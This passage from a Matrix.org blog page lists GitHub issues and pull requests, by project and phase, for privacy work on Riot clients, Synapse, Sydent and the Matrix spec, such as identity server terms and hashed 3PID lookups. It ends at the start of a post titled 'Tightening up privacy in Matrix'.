<li><a href="https://github.com/vector-im/riot-web/issues/10677">10677 Change text about other users being able to invite you by email on registration page</a> (done)</li>
<li><a href="https://github.com/vector-im/riot-web/issues/10744">10744 Only set terms URLs in the account when they change</a> (done)</li>
<li><a href="https://github.com/vector-im/riot-web/issues/10749">10749 Changing from one IS to another does not trigger bound 3PID warning</a> (done)</li>
<li><a href="https://github.com/vector-im/riot-web/issues/10750">10750 Bound 3PIDs warning should better explain what's being left behind</a> (done)</li>
<li><a href="https://github.com/vector-im/riot-web/issues/10754">10754 Lowercase emails during IS lookup calls</a> (done)</li>
<li><a href="https://github.com/vector-im/riot-web/issues/10755">10755 Terms account data is meant to be additive, but currently sets only new URLs</a> (done)</li>
<li><a href="https://github.com/vector-im/riot-web/issues/10756">10756 After changing IS to termstest.matrix.org the text field isn't cleared and the button remains active</a> (done)</li>
<li><a href="https://github.com/vector-im/riot-web/issues/10757">10757 After changing IS back to vector.im the text field isn't cleared and the button remains active</a> (done)</li>
<li><a href="https://github.com/vector-im/riot-web/issues/10758">10758 Revoke may be too vague for unbinding a 3PID</a> (done)</li>
<li><a href="https://github.com/vector-im/riot-web/issues/10779">10779 When publishing a threepid to an IS, if you click 'continue' before clicking the link in your email, we delete your threepid from the HS.</a> (done)</li>
<li><a href="https://github.com/vector-im/riot-web/issues/10800">10800 Community invite should not talk about ISes at all.</a> (done)</li>
<li><a href="https://github.com/vector-im/riot-web/issues/10823">10823 IS with unagreed terms will block you from adding even unshared 3PIDs to your HS</a> (done)</li>
<li><a href="https://github.com/vector-im/riot-web/issues/10839">10839 Use the new backend APIs for adding-3pid-to-homeserver and binding-3pid-on-identity-server when they exist.</a> (done)</li>
<li><a href="https://github.com/vector-im/riot-web/issues/10878">10878 UX regression when trying to invite by email if no IS is configured</a> (done)</li>
<li><a href="https://github.com/vector-im/riot-web/issues/10883">10883 Riot should check for r0.6.0 server support alongside feature flags</a> (done)</li>
<li><a href="https://github.com/vector-im/riot-web/issues/10923">10923 Send validation tokens to submit_url from HS</a> (done)</li>
<li><a href="https://github.com/vector-im/riot-web/issues/10933">10933 Do not include ID server or access token when HS supports MSC2290</a> (done)</li>
<li><a href="https://github.com/vector-im/riot-web/issues/10939">10939 Registration with MSISDN needs to use submit_url</a> (done)</li>
<li><a href="https://github.com/vector-im/riot-web/issues/10941">10941 threepid_creds for registration and password reset still include id_server</a> (done)</li>
<li><a href="https://github.com/vector-im/riot-web/issues/10959">10959 Remove id_server from email threepid_creds</a> (done)</li>
<li><a href="https://github.com/vector-im/riot-web/issues/10604">10604 QA: Re-test ALL of the identity server interactions</a> (in progress)</li>
<li><a href="https://github.com/vector-im/riot-web/issues/10958">10958 Terms of Service nitpicks</a> (in progress)</li>
<li><a href="https://github.com/vector-im/riot-web/issues/10704">10704 We treat an empty string identity server as not having one</a></li>
</ul>
</li>
<li>vector-im/riot-ios
<ul>
<li><a href="https://github.com/vector-im/riot-ios/issues/2518">2518 Make sure there are no ugly edge cases running Riot without an integrations manager</a> (done)</li>
<li><a href="https://github.com/vector-im/riot-ios/issues/2521">2521 Privacy: Improve wording on contact upload UI</a> (done)</li>
<li><a href="https://github.com/vector-im/riot-ios/issues/2532">2532 VoIP: Stop falling back to Google for STUN</a> (done)</li>
<li><a href="https://github.com/vector-im/riot-ios/issues/2600">2600 Prompt to accept integration manager polices on use</a> (done)</li>
<li><a href="https://github.com/vector-im/riot-ios/issues/2601">2601 Decouple setting an email for password reset from publishing your threepid to the identity server and support choice of identity server (on registration)</a> (done)</li>
<li><a href="https://github.com/vector-im/riot-ios/issues/2602">2602 Prompt to accept identity server policies before inviting them to a room</a> (done)</li>
<li><a href="https://github.com/vector-im/riot-ios/issues/2603">2603 Identity server v2 API authentication</a> (done)</li>
<li><a href="https://github.com/vector-im/riot-ios/issues/2606">2606 Settings: Add a Discovery section</a> (done)</li>
<li><a href="https://github.com/vector-im/riot-ios/issues/2608">2608 Registration: Update consents flow</a> (done)</li>
<li><a href="https://github.com/vector-im/riot-ios/issues/2643">2643 Ability to disable all identity server functionality via the config file</a> (done)</li>
<li><a href="https://github.com/vector-im/riot-ios/issues/2646">2646 VoIP: Fallback to matrix.org STUN server with a confirmation dialog</a> (done)</li>
<li><a href="https://github.com/vector-im/riot-ios/issues/2647">2647 MXRestClient: Move IS API to its own</a> (done)</li>
<li><a href="https://github.com/vector-im/riot-ios/issues/2648">2648 Remove the bind true flag from 3PID calls on registration</a> (done)</li>
<li><a href="https://github.com/vector-im/riot-ios/issues/2650">2650 Remove the bind true flag from 3PID adds in settings</a> (done)</li>
<li><a href="https://github.com/vector-im/riot-ios/issues/2651">2651 Store identity server in Account Data and support choosing identity server integration in User Settings</a> (done)</li>
<li><a href="https://github.com/vector-im/riot-ios/issues/2652">2652 Use the hashed v2 lookup API for 3PIDs</a> (done)</li>
<li><a href="https://github.com/vector-im/riot-ios/issues/2653">2653 Allow email registration, password reset &amp; adding 3pids when no IS</a> (done)</li>
<li><a href="https://github.com/vector-im/riot-ios/issues/2654">2654 Use nicer APIs for toggling a 3PID's shared status</a> (done)</li>
<li><a href="https://github.com/vector-im/riot-ios/issues/2657">2657 Allow email registration when no IS</a> (done)</li>
<li><a href="https://github.com/vector-im/riot-ios/issues/2658">2658 Allow password reset when no IS</a> (done)</li>
<li><a href="https://github.com/vector-im/riot-ios/issues/2659">2659 Allow adding 3pids when no IS</a> (done)</li>
<li><a href="https://github.com/vector-im/riot-ios/issues/2660">2660 Handle terms agreement in the Discovery section of settings</a> (done)</li>
<li><a href="https://github.com/vector-im/riot-ios/issues/2661">2661 Remove the ability to set an IS at login/registration</a> (done)</li>
<li><a href="https://github.com/vector-im/riot-ios/issues/2662">2662 We should make it clear in the UI that device names are publicly readable</a> (done)</li>
<li><a href="https://github.com/vector-im/riot-ios/issues/2664">2664 Placeholder issue for privacy migration path</a> (done)</li>
<li><a href="https://github.com/vector-im/riot-ios/issues/2665">2665 Ensure IS in account data is read / written as specced</a> (done)</li>
<li><a href="https://github.com/vector-im/riot-ios/issues/2672">2672 Handle the case of no IS in features that require IS to lookup</a> (done)</li>
<li><a href="https://github.com/vector-im/riot-ios/issues/2675">2675 Email help text on registration should be updated without binding</a> (done)</li>
<li><a href="https://github.com/vector-im/riot-ios/issues/2682">2682 Send IS for adding MSISDNs only when required by HS</a> (done)</li>
<li><a href="https://github.com/vector-im/riot-ios/issues/2686">2686 Use wellknown to discover the IS of a custom HS</a> (done)</li>
<li><a href="https://github.com/vector-im/riot-ios/issues/2696">2696 Lowercase emails during IS lookup calls</a> (done)</li>
<li><a href="https://github.com/vector-im/riot-ios/issues/2704">2704 Use <code>id_access_token</code> in CS API when required</a> (done)</li>
<li><a href="https://github.com/vector-im/riot-ios/issues/2604">2604 Settings: Ability to change the identity server</a> (in progress)</li>
<li><a href="https://github.com/vector-im/riot-ios/issues/2649">2649 Ability to disconnect from the identity server by pressing buttons in user settings</a> (in progress)</li>
<li><a href="https://github.com/vector-im/riot-ios/issues/2713">2713 Use the new backend APIs for adding-3pid-to-homeserver and binding-3pid-on-identity-server when they exist.</a> (in progress)</li>
<li><a href="https://github.com/vector-im/riot-ios/issues/2718">2718 Riot should check for r0.6.0 server support alongside feature flags</a> (in progress)</li>
<li><a href="https://github.com/vector-im/riot-ios/issues/2683">2683 Checking email invite account is unclear when no IS set</a></li>
<li><a href="https://github.com/vector-im/riot-ios/issues/2731">2731 Send validation tokens to submit_url from HS</a></li>
<li><a href="https://github.com/vector-im/riot-ios/issues/2732">2732 Do not include ID server or access token when HS supports MSC2290</a></li>
<li><a href="https://github.com/vector-im/riot-ios/issues/2736">2736 IS terms cannot be accepted anymore</a></li>
</ul>
</li>
<li>vector-im/riot-android
<ul>
<li><a href="https://github.com/vector-im/riot-android/issues/3223">3223 VoIP: Stop falling back to Google for STUN</a> (done)</li>
<li><a href="https://github.com/vector-im/riot-android/issues/3224">3224 Make sure there are no ugly edge cases running Riot without an integrations manager</a> (done)</li>
<li><a href="https://github.com/vector-im/riot-android/issues/3225">3225 Prompt to accept integration manager polices on use </a>(done)</li>
<li><a href="https://github.com/vector-im/riot-android/issues/3226">3226 Decouple setting an email for password reset from publishing your threepid to the identity server and support choice of identity server (on registration)</a> (done)</li>
<li><a href="https://github.com/vector-im/riot-android/issues/3227">3227 Prompt to accept identity server policies before inviting them to a room</a> (done)</li>
<li><a href="https://github.com/vector-im/riot-android/issues/3228">3228 Identity server v2 API authentication</a> (done)</li>
<li><a href="https://github.com/vector-im/riot-android/issues/3229">3229 Settings: Ability to change the identity server</a> (done)</li>
<li><a href="https://github.com/vector-im/riot-android/issues/3230">3230 Settings: Add a Discovery section</a> (done)</li>
<li><a href="https://github.com/vector-im/riot-android/issues/3231">3231 Registration: Update consents flow</a> (done)</li>
<li><a href="https://github.com/vector-im/riot-android/issues/3252">3252 Remove the bind true flag from 3PID calls on registration</a> (done)</li>
<li><a href="https://github.com/vector-im/riot-android/issues/3253">3253 Ability to disconnect from the identity server by pressing buttons in user settings</a> (done)</li>
<li><a href="https://github.com/vector-im/riot-android/issues/3254">3254 Remove the bind true flag from 3PID adds in settings</a> (done)</li>
<li><a href="https://github.com/vector-im/riot-android/issues/3256">3256 Store identity server in Account Data and support choosing identity server integration in User Settings</a> (done)</li>
<li><a href="https://github.com/vector-im/riot-android/issues/3257">3257 Use the hashed v2 lookup API for 3PIDs</a> (done)</li>
<li><a href="https://github.com/vector-im/riot-android/issues/3258">3258 Allow email registration, password reset &amp; adding 3pids when no IS</a> (done)</li>
<li><a href="https://github.com/vector-im/riot-android/issues/3260">3260 Allow email registration when no IS</a> (done)</li>
<li><a href="https://github.com/vector-im/riot-android/issues/3261">3261 Allow password reset when no IS</a> (done)</li>
<li><a href="https://github.com/vector-im/riot-android/issues/3262">3262 Allow adding 3pids when no IS</a> (done)</li>
<li><a href="https://github.com/vector-im/riot-android/issues/3263">3263 Handle terms agreement in the Discovery section of settings</a> (done)</li>
<li><a href="https://github.com/vector-im/riot-android/issues/3264">3264 Remove the ability to set an IS at login/registration</a> (done)</li>
<li><a href="https://github.com/vector-im/riot-android/issues/3265">3265 We should make it clear in the UI that device names are publicly readable</a> (done)</li>
<li><a href="https://github.com/vector-im/riot-android/issues/3268">3268 Placeholder issue for privacy migration path</a> (done)</li>
<li><a href="https://github.com/vector-im/riot-android/issues/3269">3269 Ensure IS in account data is read / written as specced</a> (done)</li>
<li><a href="https://github.com/vector-im/riot-android/issues/3277">3277 Handle the case of no IS in features that require IS to lookup</a> (done)</li>
<li><a href="https://github.com/vector-im/riot-android/issues/3278">3278 Email help text on registration should be updated without binding</a> (done)</li>
<li><a href="https://github.com/vector-im/riot-android/issues/3281">3281 Send IS for adding MSISDNs only when required by HS</a> (done)</li>
<li><a href="https://github.com/vector-im/riot-android/issues/3283">3283 Use wellknown to discover the IS of a custom HS</a> (done)</li>
<li><a href="https://github.com/vector-im/riot-android/issues/3289">3289 Lowercase emails during IS lookup calls</a> (done)</li>
<li><a href="https://github.com/vector-im/riot-android/issues/3295">3295 Use <code>id_access_token</code> in CS API when required</a> (done)</li>
<li><a href="https://github.com/vector-im/riot-android/issues/3300">3300 Use the new backend APIs for adding-3pid-to-homeserver and binding-3pid-on-identity-server when they exist. </a>(done)</li>
<li><a href="https://github.com/vector-im/riot-android/issues/3312">3312 Riot should check for r0.6.0 server support alongside feature flags</a> (done)</li>
<li><a href="https://github.com/vector-im/riot-android/issues/3316">3316 Implement MSC2290</a> (done)</li>
<li><a href="https://github.com/vector-im/riot-android/issues/3324">3324 id_server param sent when registering an email on server that does not requires one</a> (done)</li>
<li><a href="https://github.com/vector-im/riot-android/issues/3326">3326 Discovery Settings / infinite loading if terms not signed on existing IS</a> (done)</li>
<li><a href="https://github.com/vector-im/riot-android/issues/3327">3327 vector.im is seen as having no terms, but it does</a> (done)</li>
<li><a href="https://github.com/vector-im/riot-android/issues/3251">3251 VoIP: Fallback to matrix.org STUN server with a confirmation dialog</a> (in progress)</li>
<li><a href="https://github.com/vector-im/riot-android/issues/3248">3248 Ability to disable all identity server functionality via the config file</a></li>
<li><a href="https://github.com/vector-im/riot-android/issues/3318">3318 Send validation tokens to submit_url from HS</a></li>
<li><a href="https://github.com/vector-im/riot-android/issues/3322">3322 Do not include ID server or access token when HS supports MSC2290</a></li>
</ul>
</li>
<li>vector-im/riotX-android
<ul>
<li><a href="https://github.com/vector-im/riotX-android/issues/490">490 Allow email registration, password reset &amp; adding 3pids when no IS</a> (done)</li>
<li><a href="https://github.com/vector-im/riotX-android/issues/432">432 Prompt to accept integration manager polices on use</a> (in progress)</li>
<li><a href="https://github.com/vector-im/riotX-android/issues/431">431 Make sure there are no ugly edge cases running Riot without an integrations manager</a></li>
<li><a href="https://github.com/vector-im/riotX-android/issues/433">433 Decouple setting an email for password reset from publishing your threepid to the identity server and support choice of identity server (on registration)</a></li>
<li><a href="https://github.com/vector-im/riotX-android/issues/434">434 Prompt to accept identity server policies before inviting them to a room</a></li>
<li><a href="https://github.com/vector-im/riotX-android/issues/435">435 Identity server v2 API authentication</a></li>
<li><a href="https://github.com/vector-im/riotX-android/issues/436">436 Settings: Ability to change the identity server</a></li>
<li><a href="https://github.com/vector-im/riotX-android/issues/438">438 Settings: Add a Discovery section</a></li>
<li><a href="https://github.com/vector-im/riotX-android/issues/439">439 Registration: Update consents flow</a></li>
<li><a href="https://github.com/vector-im/riotX-android/issues/489">489 Use the hashed v2 lookup API for 3PIDs</a></li>
</ul>
</li>
<li>matrix-org/matrix-doc
<ul>
<li><a href="https://github.com/matrix-org/matrix-doc/pull/1961">1961 MSC1961: Integration manager authentication APIs</a> (done)</li>
<li><a href="https://github.com/matrix-org/matrix-doc/pull/2078">2078 MSC2078: Sending Third-Party Request Tokens via the Homeserver</a> (done)</li>
<li><a href="https://github.com/matrix-org/matrix-doc/issues/2130">2130 Identity service should do lookups based on hashed 3PIDs, not plaintext ones.</a> (done)</li>
<li><a href="https://github.com/matrix-org/matrix-doc/pull/2134">2134 MSC2134: Identity Hash Lookups</a> (done)</li>
<li><a href="https://github.com/matrix-org/matrix-doc/issues/2139">2139 Method for ISes and Integration managers to provide terms of service</a> (done)</li>
<li><a href="https://github.com/matrix-org/matrix-doc/pull/2140">2140 MSC2140: Terms of Service for ISes and IMs</a> (done)</li>
<li><a href="https://github.com/matrix-org/matrix-doc/pull/2229">2229 MSC2229: Allowing 3PID Owners to Rebind</a> (done)</li>
<li><a href="https://github.com/matrix-org/matrix-doc/pull/2230">2230 MSC2230: Store Identity Server in Account Data</a> (done)</li>
<li><a href="https://github.com/matrix-org/matrix-doc/pull/2263">2263 MSC2263: Give homeservers the ability to handle their own 3PID registrations/password resets</a> (done)</li>
<li><a href="https://github.com/matrix-org/matrix-doc/pull/2264">2264 MSC2264: Add an unstable feature flag to MSC2140 for clients to detect support</a> (done)</li>
<li><a href="https://github.com/matrix-org/matrix-doc/pull/2290">2290 MSC2290: Separate Endpoints for Threepid Binding</a> (in progress)</li>
</ul>
</li>
<li>matrix-org/sydent
<ul>
<li><a href="https://github.com/matrix-org/sydent/issues/178">178 Support for MSC2140</a> (done)</li>
<li><a href="https://github.com/matrix-org/sydent/pull/179">179 Support testing with matrix-is-tester</a> (done)</li>
<li><a href="https://github.com/matrix-org/sydent/pull/180">180 Support for MSC2140</a> (done)</li>
<li><a href="https://github.com/matrix-org/sydent/pull/181">181 Deny bindings to anything other than the mxid you're authed as</a> (done)</li>
<li><a href="https://github.com/matrix-org/sydent/pull/184">184 Hash 3PID lookups</a> (done)</li>
<li><a href="https://github.com/matrix-org/sydent/pull/186">186 Don't fail the unbind request if the binding doesn't exist</a> (done)</li>
<li><a href="https://github.com/matrix-org/sydent/pull/187">187 Add more tweaks to terms branch</a> (done)</li>
<li><a href="https://github.com/matrix-org/sydent/issues/189">189 Redact looked-up threepids from the application logs.</a> (done)</li>
<li><a href="https://github.com/matrix-org/sydent/issues/191">191 Add OpenID auth to 3PID hash lookup</a> (done)</li>
<li><a href="https://github.com/matrix-org/sydent/pull/197">197 Have 'mappings' contain medium as well as address</a> (done)</li>
<li><a href="https://github.com/matrix-org/sydent/pull/198">198 Throw exception on bad args &amp; catch in wrapper</a> (done)</li>
<li><a href="https://github.com/matrix-org/sydent/pull/199">199 Return algorithm, lookup_pepper in M_INVALID_PEPPER response</a> (done)</li>
<li><a href="https://github.com/matrix-org/sydent/pull/200">200 Support MSC2140 register/terms endpoints</a> (done)</li>
<li><a href="https://github.com/matrix-org/sydent/pull/201">201 Port v1 endpoints to v2</a> (done)</li>
<li><a href="https://github.com/matrix-org/sydent/pull/202">202 Deny bindings to anything other than the mxid you're authed as</a> (done)</li>
<li><a href="https://github.com/matrix-org/sydent/pull/204">204 Fix the signing servlet</a> (done)</li>
<li><a href="https://github.com/matrix-org/sydent/pull/205">205 Correct API v1 path check in get_args</a> (done)</li>
<li><a href="https://github.com/matrix-org/sydent/pull/206">206 Fix terms POST</a> (done)</li>
<li><a href="https://github.com/matrix-org/sydent/issues/207">207 Deploy policy file</a> (done)</li>
<li><a href="https://github.com/matrix-org/sydent/pull/208">208 Remove PII logging from log-level INFO</a> (done)</li>
<li><a href="https://github.com/matrix-org/sydent/pull/213">213 Delete threepid assocs on unbind and remove existing with migration</a> (done)</li>
<li><a href="https://github.com/matrix-org/sydent/issues/217">217 Allow non-matrix.org MXIDs via v2 only once terms are enabled</a> (done)</li>
<li><a href="https://github.com/matrix-org/sydent/issues/218">218 Unbind fails to remove the binding on matrix.org IS</a> (done)</li>
<li><a href="https://github.com/matrix-org/sydent/issues/220">220 Unbind fails to work for bindings where it was attempted with #213</a> (done)</li>
<li><a href="https://github.com/matrix-org/sydent/issues/192">192 Sydent doesn't delete 3PIDs from DB on unbind</a> (in progress)</li>
</ul>
</li>
<li>matrix-org/synapse
<ul>
<li><a href="https://github.com/matrix-org/synapse/issues/1287">1287 We need to actually censor redactions from the DB (SYN-284)</a> (done)</li>
<li><a href="https://github.com/matrix-org/synapse/issues/5751">5751 Make homeservers able to handle registration-with-email without depending on an Identity Server</a> (done)</li>
<li><a href="https://github.com/matrix-org/synapse/issues/5786">5786 Support IS v2 API with authentication for requests proxied to the IS</a> (done)</li>
<li><a href="https://github.com/matrix-org/synapse/issues/5827">5827 Add 3PID unbind API for MSC2140</a> (done)</li>
<li><a href="https://github.com/matrix-org/synapse/pull/5835">5835 [1/2] Allow homeservers to send registration emails | Sending the email</a> (done)</li>
<li><a href="https://github.com/matrix-org/synapse/issues/5861">5861 Use the v2 lookup API for 3PID invites</a> (done)</li>
<li><a href="https://github.com/matrix-org/synapse/issues/5862">5862 Allow account owners to rebind 3PIDs as in MSC2229</a> (done)</li>
<li><a href="https://github.com/matrix-org/synapse/pull/5868">5868 Add flag in /versions for whether clients should send id_server params</a> (done)</li>
<li><a href="https://github.com/matrix-org/synapse/issues/5874">5874 Placeholder issue for privacy migration path</a> (done)</li>
<li><a href="https://github.com/matrix-org/synapse/pull/5875">5875 Remove trusted_third_party_id_servers functionality</a> (done)</li>
<li><a href="https://github.com/matrix-org/synapse/pull/5876">5876 Replace trust_identity_server_for_password_resets with account_threepid_delegate</a> (done)</li>
<li><a href="https://github.com/matrix-org/synapse/pull/5892">5892 Switch to using v2 Identity Service APIs other than lookup (MSC 2140)</a> (done)</li>
<li><a href="https://github.com/matrix-org/synapse/pull/5897">5897 Use the v2 lookup API for 3PID invites</a> (done)</li>
<li><a href="https://github.com/matrix-org/synapse/issues/5927">5927 Add a m.id_access_token flag to unstable_features</a> (done)</li>
<li><a href="https://github.com/matrix-org/synapse/issues/5928">5928 Split account_threepid_handler into a msisdn and email versions</a> (done)</li>
<li><a href="https://github.com/matrix-org/synapse/issues/5929">5929 Use account_threepid_delegate for sending SMS</a> (done)</li>
<li><a href="https://github.com/matrix-org/synapse/pull/5930">5930 Add m.id_access_token flag</a> (done)</li>
<li><a href="https://github.com/matrix-org/synapse/pull/5934">5934 Censor redactions in DB after a month</a> (done)</li>
<li><a href="https://github.com/matrix-org/synapse/issues/5935">5935 Use federation blacklist for requests to identity servers</a> (done)</li>
<li><a href="https://github.com/matrix-org/synapse/pull/5937">5937 Revert &quot;Use the v2 lookup API for 3PID invites&quot;</a> (done)</li>
<li><a href="https://github.com/matrix-org/synapse/pull/5940">5940 [2/2] Allow homeservers to send registration emails | Accepting the verification</a> (done)</li>
<li><a href="https://github.com/matrix-org/synapse/pull/5945">5945 Revert &quot;Add m.id_access_token flag&quot;</a> (done)</li>
<li><a href="https://github.com/matrix-org/synapse/pull/5948">5948 Support v2 Identity Server APIs</a> (done)</li>
<li><a href="https://github.com/matrix-org/synapse/pull/5964">5964 Remove bind_email and bind_msisdn</a> (done)</li>
<li><a href="https://github.com/matrix-org/synapse/pull/5968">5968 Set m.require_identity_server to always be False</a> (done)</li>
<li><a href="https://github.com/matrix-org/synapse/pull/5969">5969 Change account_threepid_delegate to a dictionary</a> (done)</li>
<li><a href="https://github.com/matrix-org/synapse/pull/5972">5972 Add m.require_identity_server to /versions unstable_flags</a> (done)</li>
<li><a href="https://github.com/matrix-org/synapse/pull/5974">5974 Add m.id_access_token to /versions unstable_features (MSC2264)</a> (done)</li>
<li><a href="https://github.com/matrix-org/synapse/pull/5976">5976 Use the v2 Identity Service API for lookups (MSC2134 + MSC2140)</a> (done)</li>
<li><a href="https://github.com/matrix-org/synapse/pull/5979">5979 v2 3PID Invites (part of MSC2140)</a> (done)</li>
<li><a href="https://github.com/matrix-org/synapse/pull/5980">5980 Add POST /_matrix/client/r0/account/3pid/unbind (MSC2140)</a> (done)</li>
<li><a href="https://github.com/matrix-org/synapse/pull/5987">5987 Allow Synapse to send registration emails + choose Synapse or an external server to handle 3pid validation</a> (done)</li>
<li><a href="https://github.com/matrix-org/synapse/pull/5996">5996 Allow users to rebind 3pids they own (MSC2229)</a> (done)</li>
<li><a href="https://github.com/matrix-org/synapse/pull/6000">6000 Use the federation blacklist for requests to untrusted Identity Servers</a> (done)</li>
<li><a href="https://github.com/matrix-org/synapse/pull/6011">6011 Use account_threepid_delegate for 3pid validation</a> (done)</li>
<li><a href="https://github.com/matrix-org/synapse/pull/6013">6013 Fix existing v2 identity server calls (MSC2140)</a> (done)</li>
<li><a href="https://github.com/matrix-org/synapse/pull/6042">6042 Allow HS to send emails when adding an email to the HS</a> (done)</li>
<li><a href="https://github.com/matrix-org/synapse/pull/6043">6043 Implement MSC2290</a> (done)</li>
<li><a href="https://github.com/matrix-org/synapse/pull/6044">6044 Add an unstable feature flag for separate add/bind 3pid APIs</a> (done)</li>
<li><a href="https://github.com/matrix-org/synapse/pull/6062">6062 Use unstable prefix for 3PID unbind API</a> (done)</li>
<li><a href="https://github.com/matrix-org/synapse/pull/6067">6067 Drop support for bind param on POST /account/3pid (MSC2290)</a> (done)</li>
<li><a href="https://github.com/matrix-org/synapse/issues/6076">6076 Synapse doesn't give clients a submit_url on requestToken breaking msisdn adding</a> (done)</li>
<li><a href="https://github.com/matrix-org/synapse/pull/6078">6078 Add POST submit_token endpoint for MSISDN</a> (done)</li>
<li><a href="https://github.com/matrix-org/synapse/pull/6079">6079 Add submit_url response parameter to msisdn /requestToken</a> (done)</li>
<li><a href="https://github.com/matrix-org/synapse/issues/6087">6087 Remove hardcoded defaults of matrix.org and vector.im in configuration</a> (done)</li>
<li><a href="https://github.com/matrix-org/synapse/pull/6090">6090 Explicitly log when a homeserver does not have a trusted key server configured </a>(done)</li>
<li><a href="https://github.com/matrix-org/synapse/issues/6096">6096 Riot Web expects the email validation next_link to have the sid appended</a> (done)</li>
<li><a href="https://github.com/matrix-org/synapse/issues/6100">6100 Remove email from registration flows if it’s unsupported</a> (done)</li>
<li><a href="https://github.com/matrix-org/synapse/issues/6103">6103 _check_threepid in auth.py incorrect for MSISDN</a> (done)</li>
<li><a href="https://github.com/matrix-org/synapse/issues/6045">6045 Support Client-Server API r0.6.0</a> (in progress)</li>
<li><a href="https://github.com/matrix-org/synapse/issues/1263">1263 When we redact events, any mxc content they refer to should be redacted too (SYN-216)</a></li>
<li><a href="https://github.com/matrix-org/synapse/issues/4565">4565 Metadata resistance.</a></li>
<li><a href="https://github.com/matrix-org/synapse/issues/6086">6086 Fetch signing-keys directly from servers before falling back to the trusted_key_servers</a></li>
</ul>
</li>
</ul>
</li>
<li>phase:2
<ul>
<li>vector-im/riot-web
<ul>
<li><a href="https://github.com/vector-im/riot-web/issues/4913">4913 Option for homeservers to set a default integration manager</a> (done)</li>
<li><a href="https://github.com/vector-im/riot-web/issues/10161">10161 Store Integration Manager preferences in account data and allow user to change them somewhere sensible</a> (done)</li>
<li><a href="https://github.com/vector-im/riot-web/issues/10967">10967 Disconnect from identity server fails</a> (done)</li>
<li><a href="https://github.com/vector-im/riot-web/issues/10443">10443 Remove v1 IS API fallbacks once servers are updated</a></li>
<li><a href="https://github.com/vector-im/riot-web/issues/10557">10557 Prompt users each time before sending data to an Identity Server that doesn't have a terms of service (unless you have actively set that IS in your account data).</a></li>
<li><a href="https://github.com/vector-im/riot-web/issues/10696">10696 Allow users to disconnect from an integration manager entirely in the same way that we support doing this for identity servers</a></li>
<li><a href="https://github.com/vector-im/riot-web/issues/10909">10909 Unable to disconnect from IS if the server is unavailable</a></li>
<li><a href="https://github.com/vector-im/riot-web/issues/10936">10936 Refine submit_url handling to only activate with separate add and bind</a></li>
</ul>
</li>
<li>vector-im/riot-ios
<ul>
<li><a href="https://github.com/vector-im/riot-ios/issues/2711">2711 Provide a better UX for users considering sharing their contact list with an IS to discover people they know already using Matrix</a></li>
</ul>
</li>
<li>vector-im/riot-android
<ul>
<li><a href="https://github.com/vector-im/riot-android/issues/3282">3282 Checking email invite account is unclear when no IS set</a></li>
<li><a href="https://github.com/vector-im/riot-android/issues/3323">3323 Post MSC2290 bug / Clicking on the validation mail link fails registration</a></li>
</ul>
</li>
<li>matrix-org/matrix-doc
<ul>
<li><a href="https://github.com/matrix-org/matrix-doc/pull/1957">1957 MSC1957: Integration manager discovery</a> (done)</li>
</ul>
</li>
<li>matrix-org/sydent
<ul>
<li><a href="https://github.com/matrix-org/sydent/issues/196">196 Remove the lookup_hash field from local_threepid_associations</a> (in progress)</li>
</ul>
</li>
<li>matrix-org/synapse
<ul>
<li><a href="https://github.com/matrix-org/synapse/issues/5881">5881 Remove trust_identity_server_for_password_resets and account_threepid_delegate options</a></li>
</ul>
</li>
</ul>
</li>
<li>phase:3
<ul>
<li>vector-im/riot-web
<ul>
<li><a href="https://github.com/vector-im/riot-web/issues/10563">10563 Add better domain for turn.matrix.org use as STUN server</a> (done)</li>
<li><a href="https://github.com/vector-im/riot-web/issues/10087">10087 Prompt to accept integration manager policies on registration</a></li>
<li><a href="https://github.com/vector-im/riot-web/issues/10167">10167 Present an aggregated terms of service dialogue at registration if possible</a></li>
<li><a href="https://github.com/vector-im/riot-web/issues/10168">10168 If a user has disabled the identity server integration on their account, we should make invite user handle this nicely</a></li>
<li><a href="https://github.com/vector-im/riot-web/issues/10401">10401 Invite new users to publish their threepids to the identity server</a></li>
<li><a href="https://github.com/vector-im/riot-web/issues/10422">10422 Use more contextual prompt for integration manager polices on use</a></li>
<li><a href="https://github.com/vector-im/riot-web/issues/10453">10453 Log out from IM on Riot log out and IM removal</a></li>
<li><a href="https://github.com/vector-im/riot-web/issues/10455">10455 Log out from IS on Riot log out and IS removal</a></li>
<li><a href="https://github.com/vector-im/riot-web/issues/10487">10487 Store the date of users having read and accepted the IM policies in the IM db</a></li>
<li><a href="https://github.com/vector-im/riot-web/issues/10488">10488 Store the date of users having read and accepted the IS policies in the IS db</a></li>
<li><a href="https://github.com/vector-im/riot-web/issues/10498">10498 Terms test scalar requires the legacy ?v query param on the new account route</a></li>
<li><a href="https://github.com/vector-im/riot-web/issues/10575">10575 We should show the 'must configure TURN' warning when a call fails, even after using the fallback turn.matrix.org</a></li>
<li><a href="https://github.com/vector-im/riot-web/issues/10615">10615 Change all IS access token APIs to use getIdentityAccessToken only</a></li>
<li><a href="https://github.com/vector-im/riot-web/issues/10671">10671 riot submits sign-ed25519 requests as POST requests with params in query string and empty body</a></li>
<li><a href="https://github.com/vector-im/riot-web/issues/10746">10746 /invite doesn't force terms with older homeservers</a></li>
<li><a href="https://github.com/vector-im/riot-web/issues/10830">10830 Show IS policy links in user settings somewhere.</a></li>
<li><a href="https://github.com/vector-im/riot-web/issues/10950">10950 Unhelpful 400 error when adding MSISDN and server doesn’t delegate</a></li>
</ul>
</li>
<li>vector-im/riot-ios
<ul>
<li><a href="https://github.com/vector-im/riot-ios/issues/2710">2710 Show IS policy links in user settings somewhere.</a></li>
</ul>
</li>
<li>matrix-org/matrix-doc
<ul>
<li><a href="https://github.com/matrix-org/matrix-doc/issues/447">447 We need a way to be able to expire data from a HS. (SPEC-141)</a></li>
</ul>
</li>
<li>matrix-org/synapse
<ul>
<li><a href="https://github.com/matrix-org/synapse/issues/5830">5830 <code>pushers</code> table contains user device names, which may include user real names</a></li>
</ul>
</li>
</ul>
</li>
</ul>

                
            </div>
        </article>
        
        <article class="post">
            <header>
                <h2><a href="&#x2F;blog&#x2F;2019&#x2F;06&#x2F;30&#x2F;tightening-up-privacy-in-matrix&#x2F;" title="Tightening up privacy in Matrix">Tightening up privacy in Matrix</a></h2>
                <span>
                    30.06.2019 00:00
                    —
                    <a href="/category/general">
                        General
                    </a>
                    —
                    <a
                        href="/author/matthew-hodgson">
                        Matthew Hodgson
                    </a>
                </span>
                
            </header>
            <div>
                
                <p>Hi all,</p>
<p>A few weeks ago there was <a href="https://news.ycombinator.com/item?id=20178267">some
discussion</a> around the privacy
of typical Matrix configurations, particularly how Riot's default config uses
vector.im as an Identity Server (for discovering users on Matrix by their email
